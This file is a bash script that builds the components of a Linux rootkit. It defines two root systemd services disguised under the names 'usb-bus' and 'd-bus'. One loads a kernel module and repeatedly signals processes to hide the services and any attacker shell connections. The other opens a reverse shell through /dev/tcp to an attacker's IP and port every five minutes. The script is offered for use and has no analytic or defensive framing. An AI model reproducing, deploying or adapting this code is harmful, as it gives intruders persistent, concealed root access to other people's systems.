#!/bin/bash

#--1st systemd service--
#that's the script that is gonna insert the usb-bus rootkit module at boot, hide the systemd services and the bash processes
hiding_script=$(cat << \EOF
#!/bin/bash

insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko

while true; do

#-hide usb-bus and d-bus, which are the scripts that the systemd services execute-
#find all the bash processes
bash_pids=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
read -a bash_array <<<$bash_pids

#hide the services
for i in ${bash_array[@]}; do
  cmd=$(cat /proc/$i/cmdline 2>/dev/null)
  if [ "$?" == "1" ]; then
    continue
  fi
  if [ "$cmd" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmd" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
    kill -31 $i
  fi
done

#-hide bash shells which our systemd service spawns-
#find all the pids
pids=$(ps aux | awk '{print $2}')
read -a pid_array <<<$pids

#find all the inodes
inodes=$(cat /proc/net/tcp | awk '{ if($3 ~ /0150A8C0:270F/) print $10 }')
read -a inode_array <<<$inodes

#hide the bash shells
for p in ${pid_array[@]}; do
  for i in ${inode_array[@]}; do
    for (( j=0; j <= 2; j=j+1 )); do
      socket=$(readlink /proc/$p/fd/$j)
      if [ "socket:[$i]" == "$socket" ]; then
        kill -31 $p
      fi
    done
  done
done

sleep 1

done
EOF
)

#that's the systemd service that's gonna do the hiding
hiding_service=$(cat << \EOF
[Unit]
After=multi-user.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/var/lib/usb-bus/usb-bus
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)

#--2nd systemd service--
#that's the script that's gonna open the bash connections
bash_script=$(cat << EOF
#!/bin/bash

while true; do

bash &>/dev/tcp/$ip/$port <&1 &
sleep 300

done
EOF
)

#that's the systemd service that's gonna open the bash connections
bash_service=$(cat << \EOF
[Unit]
After=multi-user.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart=/usr/local/share/d-bus/d-bus
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
)
